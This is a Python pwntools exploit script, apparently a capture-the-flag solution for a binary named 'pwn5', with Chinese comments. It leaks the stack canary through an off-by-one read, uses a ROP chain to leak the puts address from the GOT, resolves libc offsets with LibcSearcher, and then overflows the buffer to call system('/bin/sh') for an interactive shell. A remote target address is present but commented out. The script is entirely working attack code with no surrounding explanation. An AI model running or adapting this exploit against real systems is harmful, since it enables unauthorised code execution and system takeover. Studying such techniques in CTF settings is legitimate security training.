from pwn import *
from LibcSearcher import *
#p = remote('10.212.25.14', 12138)
p = process('./pwn5')
elf = ELF('./pwn5')
main_addr = elf.symbols['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0400803
ret_addr = 0x040055e
payload = 'b'*(0x28+1) # 多一位填充泄露canary
p.sendafter("make a try!", payload)
p.recvuntil('b'*(0x28))
canary = u64(p.recv(8)) - ord('b')
#print(hex(canary))
payload = b'a'*(0x28) + p64(canary) + b'a'*8 + p64(pop_rdi) + p64(puts_got) +p64(puts_plt) + p64(main_addr) # 弹出rdi存入puts的got地址，调用puts泄露地址
p.sendline(payload)

puts_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))
print(hex(puts_addr))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
sys_addr = libc.dump('system') + libc_base
bin_sh_addr = libc.dump('str_bin_sh') + libc_base
payload = 'b'*(0x28+1)
p.sendafter("make a try!", payload)
p.recvuntil('b'*(0x28))
canary = u64(p.recv(8)) - ord('b')
print(hex(canary))
payload = b'a'*(0x28)+ p64(canary) + b'a'*8 + p64(ret_addr) + p64(pop_rdi) +p64(bin_sh_addr) + p64(sys_addr) + b'a'*8 # 溢出
p.sendline(payload)
p.interactive()